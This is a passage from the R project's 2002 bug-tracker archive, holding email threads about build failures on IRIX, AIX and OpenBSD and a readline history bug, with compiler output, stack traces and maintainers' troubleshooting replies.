MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII



On 22 Jan 2002, Peter Dalgaard BSA wrote:

> wtautz@math.uwaterloo.ca writes:
> 
> > I have included the full configure/make output:
> > (the particular error regarding bessel_i.c is at
> > the END of the report). 
> ...
> > bessel_i.c: In function `I_bessel':
> > bessel_i.c:468: internal error--unrecognizable insn:
> > (insn 1418 1417 673 (set:DF (reg/v:DF 101)
> >         (if_then_else:DF (ne (reg:DI 416)
> >                 (const_int 0 [0x0]))
> >             (reg/v:DF 101)
> >             (reg:DF 415))) -1 (insn_list 1417 (nil))
> >     (expr_list:REG_DEAD (reg:DI 416)
> >         (nil)))
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> > *** Error code 1 (bu21)
> 
> That looks like a problem in the gcc compiler suite. You might try
> upgrading the compiler. Sometimes changing compiler flags (you would
> only need to do it for the offending module) does the trick. 
> 
> Another possibility is that gcc is generating code that the system
> assembler doesn't understand (this is happening with gcc 3 on
> Solaris). If so, then you might install GNU binutils.
> 

I neglected to mention that 
gcc -v gives:

gcc version 2.95.3 20010315 (release)



Here is a more verbose output if that helps:




Reading specs from /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/specs
gcc version 2.95.3 20010315 (release)
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/cpp0 -lang-c -v -I. -I../../src/include -I../../src/include -D__GNUC__=2 -D__GNUC_MINOR__=95 -Dunix -Dmips -Dsgi -Dhost_mips -DMIPSEB -D_MIPSEB -DSYSTYPE_SVR4 -D_LONGLONG -D_SVR4
_SOURCE -D_MODERN_C -D__DSO__ -D__unix__ -D__mips__ -D__sgi__ -D__host_mips__ -D__MIPSEB__ -D_MIPSEB -D__SYSTYPE_SVR4__ -D_LONGLONG -D_SVR4_SOURCE -D_MODERN_C -D__DSO__ -D__unix -D__mips -D__sgi -D__host_mips -D__MIPSEB -D__SYSTYPE_SVR4 -Asystem(unix) -As
ystem(svr4) -Acpu(mips) -Amachine(sgi) -D__CHAR_UNSIGNED__ -D__OPTIMIZE__ -g -D__LANGUAGE_C -D_LANGUAGE_C -DLANGUAGE_C -D__SIZE_TYPE__=long unsigned int -D__PTRDIFF_TYPE__=long int -D__LONG_MAX__=9223372036854775807L -D__EXTENSIONS__ -D_SGI_SOURCE -D_MIPS
_FPSET=32 -D_MIPS_ISA=_MIPS_ISA_MIPS3 -D_ABI64=3 -D_MIPS_SIM=_ABI64 -D_MIPS_SZINT=32 -D_MIPS_SZLONG=64 -D_MIPS_SZPTR=64 -D_COMPILER_VERSION=601 -U__mips -D__mips=3 -D__mips64 -DHAVE_CONFIG_H bessel_i.c /var/tmp/ccyhjiCa.i
GNU CPP version 2.95.3 20010315 (release) [AL 1.1, MM 40] SGI running IRIX 6.x
#include "..." search starts here:
#include <...> search starts here:
 .
 ../../src/include
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/../../../../mips-sgi-irix6.5/include
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/include
 /usr/include
End of search list.
The following default directories have been omitted from the search path:
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/../../../../include/g++-3
 /usr/local/include
End of omitted list.
 /.software/arch/gcc-2.95.3/distribution/lib/gcc-lib/mips-sgi-irix6.5/2.95.3/cc1 /var/tmp/ccyhjiCa.i -quiet -dumpbase bessel_i.c -mabi=64 -g -O2 -version -o /var/tmp/ccKOSzid.s
GNU C version 2.95.3 20010315 (release) (mips-sgi-irix6.5) compiled by GNU C version 2.95.3 20010315 (release).
bessel_i.c: In function `I_bessel':
bessel_i.c:468: internal error--unrecognizable insn:
(insn 1418 1417 673 (set:DF (reg/v:DF 101)
        (if_then_else:DF (ne (reg:DI 416)
                (const_int 0 [0x0]))
            (reg/v:DF 101)
            (reg:DF 415))) -1 (insn_list 1417 (nil))
    (expr_list:REG_DEAD (reg:DI 416)
        (nil)))


==> 1275.audit <==
Thu Jan 24 15:40:40 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1289 *
Subject: R 1.4.0 build fails on AIX
From: lio@hpss1.ccs.ornl.gov
Date: Wed, 30 Jan 2002 14:10:30 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1289 <==
From lio@hpss1.ccs.ornl.gov  Wed Jan 30 14:10:31 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA19022
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 14:10:30 +0100 (MET)
Date: Wed, 30 Jan 2002 14:10:30 +0100 (MET)
From: lio@hpss1.ccs.ornl.gov
Message-Id: <200201301310.OAA19022@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: R 1.4.0 build fails on AIX

Full_Name: Daniel L. Million
Version: 1.4.0
OS: AIX 5.1 and 4.3.3
Submission from: (NULL) (160.91.192.125)


Is there any guidance available on building R on AIX?  Specifically, which C 
compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX 
Visual Age C version 5.0.2.  We also have gcc available.

I have tried building with "cc" (the default AIX compiler) and "gcc".  During
the "make", C compilation in src/library/methods/src completes, and then I 
see this:

mkdir ../../../../library/methods/libs
dumping R code in package `methods'
make: 1254-059 The signal code from the last command is 11.

Apparently the make is running R.bin, which coredumps with a segmentation
violation.

Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
Any clues at all as to how to get around this?

Thanks.

Dan Million


==> 1289.followup.1 <==
From tlumley@u.washington.edu  Wed Jan 30 17:46:32 2002
Received: from jason04.u.washington.edu (jason04.u.washington.edu [140.142.8.53])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA23476
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 17:46:31 +0100 (MET)
Received: from homer40.u.washington.edu (homer40.u.washington.edu [140.142.16.6])
	by jason04.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UGjs9Y020226;
	Wed, 30 Jan 2002 08:45:54 -0800
Received: from localhost (tlumley@localhost)
	by homer40.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UGjru1095332;
	Wed, 30 Jan 2002 08:45:53 -0800
Date: Wed, 30 Jan 2002 08:45:53 -0800 (PST)
From: Thomas Lumley <tlumley@u.washington.edu>
To: lio@hpss1.ccs.ornl.gov
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <200201301310.OAA19034@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0201300827470.74956-100000@homer40.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002 lio@hpss1.ccs.ornl.gov wrote:

> Full_Name: Daniel L. Million
> Version: 1.4.0
> OS: AIX 5.1 and 4.3.3
> Submission from: (NULL) (160.91.192.125)
>
>
> Is there any guidance available on building R on AIX?  Specifically, which C
> compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX
> Visual Age C version 5.0.2.  We also have gcc available.
>
> I have tried building with "cc" (the default AIX compiler) and "gcc".  During
> the "make", C compilation in src/library/methods/src completes, and then I
> see this:
>
> mkdir ../../../../library/methods/libs
> dumping R code in package `methods'
> make: 1254-059 The signal code from the last command is 11.
>
> Apparently the make is running R.bin, which coredumps with a segmentation
> violation.
>
> Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
> Any clues at all as to how to get around this?


I have successfully built most recent versions of R including 1.4.0 with
gcc/g77 and with "C for AIX version 5"/"XL Fortran for AIX" on AIX 4.3. I
haven't been able to mix the GNU and IBM compilers, but I haven't tried
recently.  Last week I compiled R-patched successfully using gcc/g77. I
didn't have to do anything special, but AIX has often been source of
configuration bugs.

You could try not building the methods package: edit  Makeconf in the top
R/ directory and remove methods from R_PKGS.

Also, I think that it's possible to have the methods package build in the
usual source form rather than as a saved image. I don't know how, but John
Chambers or Duncan Temple Lang may be able to help.

These wouldn't actually fix the problem, but would enable you to compile
everything else.

I'll try again with the AIX compilers and the new R 1.4.1. It's possible
that there have been some changes since I last tried, since I usually do
this shortly before a release.

	-thomas



==> 1289.followup.2 <==
From lio@hpss1.ccs.ornl.gov  Wed Jan 30 20:49:57 2002
Received: from hpss1.ccs.ornl.gov (hpss1.ccs.ornl.gov [160.91.192.125])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA24914
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 20:49:56 +0100 (MET)
Received: from localhost (lio@localhost)
	by hpss1.ccs.ornl.gov (AIX4.3/8.9.3/8.9.1) with ESMTP id OAA18340;
	Wed, 30 Jan 2002 14:49:04 -0500
Date: Wed, 30 Jan 2002 14:49:04 -0500 (EST)
From: Dan Million <lio@hpss1.ccs.ornl.gov>
To: Thomas Lumley <tlumley@u.washington.edu>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>,
        Dan Million <lio@hpss1.ccs.ornl.gov>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.44.0201300827470.74956-100000@homer40.u.washington.edu>
Message-ID: <Pine.A41.4.31.0201301446540.16064-100000@hpss1.ccs.ornl.gov>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Thomas Lumley wrote:

> On Wed, 30 Jan 2002 lio@hpss1.ccs.ornl.gov wrote:
>
> > Full_Name: Daniel L. Million
> > Version: 1.4.0
> > OS: AIX 5.1 and 4.3.3
> > Submission from: (NULL) (160.91.192.125)
> >
> >
> > Is there any guidance available on building R on AIX?  Specifically, which C
> > compiler to use?  We have AIX XL Fortran version 7.1.1.  We also have AIX
> > Visual Age C version 5.0.2.  We also have gcc available.
> >
> > I have tried building with "cc" (the default AIX compiler) and "gcc".  During
> > the "make", C compilation in src/library/methods/src completes, and then I
> > see this:
> >
> > mkdir ../../../../library/methods/libs
> > dumping R code in package `methods'
> > make: 1254-059 The signal code from the last command is 11.
> >
> > Apparently the make is running R.bin, which coredumps with a segmentation
> > violation.
> >
> > Do I need to be using a thread-safe compiler (e.g., "cc_r") for this build?
> > Any clues at all as to how to get around this?
>
>
> I have successfully built most recent versions of R including 1.4.0 with
> gcc/g77 and with "C for AIX version 5"/"XL Fortran for AIX" on AIX 4.3. I
> haven't been able to mix the GNU and IBM compilers, but I haven't tried
> recently.  Last week I compiled R-patched successfully using gcc/g77. I
> didn't have to do anything special, but AIX has often been source of
> configuration bugs.
>
> You could try not building the methods package: edit  Makeconf in the top
> R/ directory and remove methods from R_PKGS.
>
> Also, I think that it's possible to have the methods package build in the
> usual source form rather than as a saved image. I don't know how, but John
> Chambers or Duncan Temple Lang may be able to help.
>
> These wouldn't actually fix the problem, but would enable you to compile
> everything else.
>
> I'll try again with the AIX compilers and the new R 1.4.1. It's possible
> that there have been some changes since I last tried, since I usually do
> this shortly before a release.
>
> 	-thomas

Thanks for the reply.  I tried building without the modules package, and
got past that point.  Now the build fails trying to link tcltk.so.  Seems
the tclConfig.sh on my host refers to a file that does not exist
(/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).

I'll freely admit to being clueless about most of this.  I don't know
anything about R; I'm just a sysadmin trying to build/install it for a
user who needs it.

Dan



==> 1289.followup.3 <==
From tlumley@u.washington.edu  Wed Jan 30 21:18:08 2002
Received: from jason03.u.washington.edu (jason03.u.washington.edu [140.142.8.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA25053
	for <R-bugs@biostat.ku.dk>; Wed, 30 Jan 2002 21:18:07 +0100 (MET)
Received: from homer04.u.washington.edu (homer04.u.washington.edu [140.142.15.38])
	by jason03.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UKHUPE052646;
	Wed, 30 Jan 2002 12:17:30 -0800
Received: from localhost (tlumley@localhost)
	by homer04.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g0UKHTUO036174;
	Wed, 30 Jan 2002 12:17:29 -0800
Date: Wed, 30 Jan 2002 12:17:29 -0800 (PST)
From: Thomas Lumley <tlumley@u.washington.edu>
To: Dan Million <lio@hpss1.ccs.ornl.gov>
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.31.0201301446540.16064-100000@hpss1.ccs.ornl.gov>
Message-ID: <Pine.A41.4.44.0201301155360.117500-100000@homer04.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Dan Million wrote:

> Thanks for the reply.  I tried building without the modules package, and
> got past that point.  Now the build fails trying to link tcltk.so.  Seems
> the tclConfig.sh on my host refers to a file that does not exist
> (/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).
>
> I'll freely admit to being clueless about most of this.  I don't know
> anything about R; I'm just a sysadmin trying to build/install it for a
> user who needs it.

Our autodetection of tcl/tk is less reliable than most stuff, partly
because the tclConfig.sh and similar files are sometimes inaccurate.  If
your users don't need tcl/tk (which is a fairly low-level set of
facilities for writing GUIs) you can again remove tcltk from the R_PKGS
line of Makeconf, or reconfigure
   ./configure --without-tcltk

If your users do need this package then you (or they) need to track down
where tcl and tk lurk and provide this information to R. Probably the
easiest way would be to install a new version of Tcl and Tk, which should
produce an honest set of configuration files.

	-thomas


==> 1289.followup.4 <==
From lio@hpss1.ccs.ornl.gov  Thu Jan 31 19:36:53 2002
Received: from hpss1.ccs.ornl.gov (hpss1.ccs.ornl.gov [160.91.192.125])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA08024
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 19:36:52 +0100 (MET)
Received: from localhost (lio@localhost)
	by hpss1.ccs.ornl.gov (AIX4.3/8.9.3/8.9.1) with ESMTP id NAA24034;
	Thu, 31 Jan 2002 13:36:00 -0500
Date: Thu, 31 Jan 2002 13:36:00 -0500 (EST)
From: Dan Million <lio@hpss1.ccs.ornl.gov>
To: Thomas Lumley <tlumley@u.washington.edu>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>,
        Dan Million <lio@hpss1.ccs.ornl.gov>
Subject: Re: [Rd] R 1.4.0 build fails on AIX (PR#1289)
In-Reply-To: <Pine.A41.4.44.0201301155360.117500-100000@homer04.u.washington.edu>
Message-ID: <Pine.A41.4.31.0201311327400.23486-100000@hpss1.ccs.ornl.gov>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 30 Jan 2002, Thomas Lumley wrote:

> On Wed, 30 Jan 2002, Dan Million wrote:
>
> > Thanks for the reply.  I tried building without the modules package, and
> > got past that point.  Now the build fails trying to link tcltk.so.  Seems
> > the tclConfig.sh on my host refers to a file that does not exist
> > (/opt/freeware/src/packages/BUILD/tcltk-8.3.3/tcl8.3.3/unix/lib.exp).
>
> Our autodetection of tcl/tk is less reliable than most stuff, partly
> because the tclConfig.sh and similar files are sometimes inaccurate.  If
> your users don't need tcl/tk (which is a fairly low-level set of
> facilities for writing GUIs) you can again remove tcltk from the R_PKGS
> line of Makeconf, or reconfigure
>    ./configure --without-tcltk
>
> If your users do need this package then you (or they) need to track down
> where tcl and tk lurk and provide this information to R. Probably the
> easiest way would be to install a new version of Tcl and Tk, which should
> produce an honest set of configuration files.

I installed and built the Tcl/Tk source RPM, and now the file that R wants
is there.  By skipping the "modules" packages, the build gets all the way
to the end.

"make check" fails rather quickly:

    running code in `base-Ex.R' .../bin/sh: 51598 Illegal
	instruction(coredump)
    make: 1254-004 The error code from the last command is 1.

When I try to run R, I get the opening info and then a "> " prompt.
I can type simple commands like help(), but whenever I type q() to
quit, I get a coredump.  This is consistent with what I saw earlier when
the build was trying to load "modules".  The stack trace in the coredump
contains this:

Segmentation fault in spin_lock_global_ppc_mp at 0xd0106644 ($t1)
0xd0106644 (spin_lock_global_ppc_mp+0x24) 7ce5192d     stwcx.   r7,r5,r3
(dbx) where
spin_lock_global_ppc_mp() at 0xd0106644
_rec_mutex_lock(??) at 0xd0170d48
__ct__Q2_3std7_LockitFi(??, ??) at 0xd0bb3a18
__dt__Q2_3std6_WinitFv(??, ??) at 0xd0bdad18
__srterm__7__Fv() at 0xd0bcbe04
exit(??) at 0xd0177c40
Rstd_CleanUp(0x3, 0x0, 0x1), line 529 in "sys-std.c"

It almost looks like R is working OK until it calls "exit", and then it
blows up.

Dan



==> 1289.audit <==
Fri Feb  1 21:55:34 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1316 *
Subject: shared libraries on AIX
From: lio@hpss1.ccs.ornl.gov
Date: Mon, 18 Feb 2002 18:53:41 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1316 <==
From lio@hpss1.ccs.ornl.gov  Mon Feb 18 18:53:43 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA04410
	for <R-bugs@biostat.ku.dk>; Mon, 18 Feb 2002 18:53:41 +0100 (MET)
Date: Mon, 18 Feb 2002 18:53:41 +0100 (MET)
From: lio@hpss1.ccs.ornl.gov
Message-Id: <200202181753.SAA04410@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: shared libraries on AIX

Full_Name: Daniel L. Million
Version: 1.4.1
OS: AIX 4.3.3/5.1
Submission from: (NULL) (160.91.192.125)


R almost works if I build on AIX without the R shared library (except for
crashing
on exit and a few other anomalies).  I can't get it to do much at all if I
build
with --enable-R-shlib.

For example, it won't load the X11 driver.  I ran R in a debugger and traced it
down to the point where R_load_X11_shlib successfully loads the R_X11.so
library
and calls R_init_X11.  This calls R_setX11Routines in src/unix/X11.c.  On entry

to this function, ptr_X11DeviceDriver = 0x2002eb20 and dev = 0x2014ba08.  After
the statement

    ptr_X11DeviceDriver = dev;

is executed, ptr_X11DeviceDriver remains unchanged at 0x2002eb20 !!  So when I
type "X11()" at the R prompt, all I ever get is the stub message, "the x11
device
has not been loaded".

I don't know enough about how shared libraries interact to understand why this
pointer is apparently write-protected.  I'm hoping someone here can give me a
clue.

Dan


==> 1316.audit <==
Tue Feb 19 10:13:59 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1461 *
Subject: make check fails d-p-q-r-tests.R - OpenBSD 3.0
From: Jason Turner <jasont@indigoindustrial.co.nz>
Date: Mon, 15 Apr 2002 10:13:36 +0000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1461 <==
From postmaster@franz.stat.wisc.edu  Mon Apr 15 12:12:38 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07647
	for <r-bugs@biostat.ku.dk>; Mon, 15 Apr 2002 12:12:37 +0200 (MET DST)
Received: from pcp-2.ihug.co.nz (really [203.109.252.66]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16x3Sh-000IamC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 15 Apr 2002 05:11:51 -0500 (CDT) 
Received: from 203-173-247-235.nzwide.ihug.co.nz (camille.indigoindustrial.co.nz) [203.173.247.235] 
	by pcp-2.ihug.co.nz with esmtp (Exim 3.22 #1 (Debian))
	id 16x3Sc-0000Ba-00; Mon, 15 Apr 2002 22:11:46 +1200
Received: (from jasont@localhost)
	by camille.indigoindustrial.co.nz (8.9.3/8.9.3) id WAA07569
	for r-bugs@r-project.org; Mon, 15 Apr 2002 22:13:36 +1200
Date: Mon, 15 Apr 2002 10:13:36 +0000
From: Jason Turner <jasont@indigoindustrial.co.nz>
To: r-bugs@r-project.org
Subject: make check fails d-p-q-r-tests.R - OpenBSD 3.0
Message-ID: <20020415101336.A7551@camille.indigoindustrial.co.nz>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
X-mailer: mutt 1.2.5i
X-Priority: Booga booga
X-FOTD: Persimmon

Found one that stumped me.  I did a search on R-bugs for the
string "d-p-q-r-tests", and found zero entries in all categories 
(I don't think I secretly gave it a regex).

Did the usual configure, make, make check on OpenBSD 3.0, and 
encountered this message on d-p-q-r-tests.Rout:

running code in `d-p-q-r-tests.R' ... OK
comparing `d-p-q-r-tests.Rout' to `./d-p-q-r-tests.Rout.save' ...251,253c251
< [1] "`is.NA' value mismatches: 800 in current, 0  in target"
< Warning message:
< NaNs produced in: exp(pab <- dbeta(p, a, b, log = TRUE))
---
> [1] TRUE
315,317c313
< [1] "`is.NA' value mismatches: 4 in current, 2  in target"
< Warning message:
< NaNs produced in: exp(z)
---
> [1] TRUE
 OK

If you're not too busy, I'd love to provide you with whatever you
need to look at this more closely than my untrained eyes can.
config.cache?  d-p-q-r-tests.Rout?  Anything else?

> version
         _
	 platform i386-unknown-openbsd3.0
	 arch     i386
	 os       openbsd3.0
	 system   i386, openbsd3.0
	 status
	 major    1
	 minor    4.1
	 year     2002
	 month    01
	 day      30
	 language R


Cheers

Jason
-- 
Indigo Industrial Controls Ltd.
64-21-343-545
jasont@indigoindustrial.co.nz

==> 1461.reply.1 <==
From maechler@stat.math.ethz.ch  Mon Apr 15 12:46:41 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07975
	for <R-bugs@biostat.ku.dk>; Mon, 15 Apr 2002 12:46:38 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id MAA17444;
	Mon, 15 Apr 2002 12:45:47 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa004GV; Mon Apr 15 12:45:43 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g3FAjYB22782;
	Mon, 15 Apr 2002 12:45:34 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15546.44877.955999.520989@gargle.gargle.HOWL>
Date: Mon, 15 Apr 2002 12:45:33 +0200
To: jasont@indigoindustrial.co.nz
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] make check fails d-p-q-r-tests.R - OpenBSD 3.0 (PR#1461)
In-Reply-To: <200204151012.MAA07652@pubhealth.ku.dk>
References: <200204151012.MAA07652@pubhealth.ku.dk>
X-Mailer: VM 6.97 under Emacs 21.1.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Jason" == Jason Turner <jasont@indigoindustrial.co.nz> writes:

    Jason> Found one that stumped me.  I did a search on R-bugs for the
    Jason> string "d-p-q-r-tests", and found zero entries in all categories 
    Jason> (I don't think I secretly gave it a regex).

    Jason> Did the usual configure, make, make check on OpenBSD 3.0, and 
    Jason> encountered this message on d-p-q-r-tests.Rout:

    Jason> running code in `d-p-q-r-tests.R' ... OK
    Jason> comparing `d-p-q-r-tests.Rout' to `./d-p-q-r-tests.Rout.save' ...251,253c251
    Jason> < [1] "`is.NA' value mismatches: 800 in current, 0  in target"
    Jason> < Warning message:
    Jason> < NaNs produced in: exp(pab <- dbeta(p, a, b, log = TRUE))
    Jason> ---
    >> [1] TRUE
    Jason> 315,317c313
    Jason> < [1] "`is.NA' value mismatches: 4 in current, 2  in target"
    Jason> < Warning message:
    Jason> < NaNs produced in: exp(z)
    Jason> ---
    >> [1] TRUE
    Jason> OK

    Jason> If you're not too busy, I'd love to provide you with whatever you
    Jason> need to look at this more closely than my untrained eyes can.
    Jason> config.cache?  d-p-q-r-tests.Rout?  Anything else?

Actually, we'd be very grateful if you could run these with
R-devel aka "R pre1.5.0" instead.

You can get a snapshot using rsync (or the tar file), see
    http://stat.ethz.ch/CRAN/sources.html

If you see the same problem (or also with 1.4.1)
look at the tests/d-p-q files
probably start R and try things like

 z <- c(-Inf,Inf,NA,NaN, rt(1000, df=2))
 z.ok <- z > -37.5 | !is.finite(z)
 for(df in 1:10)
    if(!is.logical(all.equal(pt(z, df), 1 - pt(-z,df), tol= 1e-15)))
      cat("ERROR -- df = ", df, "\n")

 c(pz <- pnorm(z), 1 - pnorm(z, lower=FALSE))
 c(pz, pnorm(-z, lower=FALSE))
 c(log(pz[z.ok]),  pnorm(z[z.ok], log=TRUE))


because these are around line 315 of tests/d-p-q-r-tests.Rout.save
and the second problem happened around there.

[A more desperate option would be to offer a login into your computer to
 someone from the R core team ...]

Thanks for helping us to have R running correctly on OpenBSD 3.0,
Martin

==> 1461.audit <==
Thu Apr 18 15:35:18 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1606 *
Subject: hitting ^C breaks readline history
From: Cyril Humbert <humbertc@univ-mlv.fr>
Date: Tue, 28 May 2002 12:07:07 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1606 <==
From humbertc@univ-mlv.fr  Tue May 28 12:07:07 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA25460
	for <R-bugs@biostat.ku.dk>; Tue, 28 May 2002 12:07:07 +0200 (MET DST)
Date: Tue, 28 May 2002 12:07:07 +0200 (MET DST)
Message-Id: <200205281007.MAA25460@pubhealth.ku.dk>
From: Cyril Humbert <humbertc@univ-mlv.fr>
To: R-bugs@biostat.ku.dk
Subject: hitting ^C breaks readline history

Full_Name: Cyril Humbert
Version: 1.5.0
OS: linux
Submission from: (NULL) (193.50.159.2)


Hitting ^C breaks readline history (when R is stared in an xterm).

xterm -e R
^C    -> arrow key and history stop working.
For example, up-arrow gives "^[[A".

ldd ./R.bin 
    [../..]
    libreadline.so.4.1 => /usr/lib/libreadline.so.4.1 (0x40020000)
    libncurses.so.5 => /usr/lib/libncurses.so.5 (0x4004c000)
    [../..]

libncurses version is 5.2.
Note. I've got the same problem with libreadline.so.4.2.

==> 1606.reply.1 <==
From p.dalgaard@biostat.ku.dk  Tue May 28 14:32:35 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA27572;
	Tue, 28 May 2002 14:32:34 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g4SCWVh01560;
	Tue, 28 May 2002 14:32:31 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: humbertc@univ-mlv.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: hitting ^C breaks readline history (PR#1606)
References: <200205281007.MAA25465@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 28 May 2002 14:32:31 +0200
In-Reply-To: <200205281007.MAA25465@pubhealth.ku.dk>
Message-ID: <x28z64fo68.fsf@blueberry.kubism.ku.dk>
Lines: 18
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

humbertc@univ-mlv.fr writes:

> Hitting ^C breaks readline history (when R is stared in an xterm).
> 
> xterm -e R
> ^C    -> arrow key and history stop working.
> For example, up-arrow gives "^[[A".

Yes, I've noticed as well. However, press Enter and things return to
normal.

If you give us a clue as to what causes the problem, we might fix it...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1606.followup.1 <==
From cyril@univ-mlv.fr  Tue May 28 14:49:35 2002
Received: from univ-mlv.fr (goodboys.univ-mlv.fr [193.50.159.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA27857;
	Tue, 28 May 2002 14:49:34 +0200 (MET DST)
Received: from cyril by univ-mlv.fr with local (Exim 3.20 #1)
	id 17CgPD-0006St-00; Tue, 28 May 2002 14:48:51 +0200
Date: Tue, 28 May 2002 14:48:50 +0200
From: Cyril Humbert <humbertc@univ-mlv.fr>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: hitting ^C breaks readline history (PR#1606)
Message-ID: <20020528144850.A24847@borneo.univ-mlv.fr>
References: <200205281007.MAA25465@pubhealth.ku.dk> <x28z64fo68.fsf@blueberry.kubism.ku.dk>
Mime-Version: 1.0
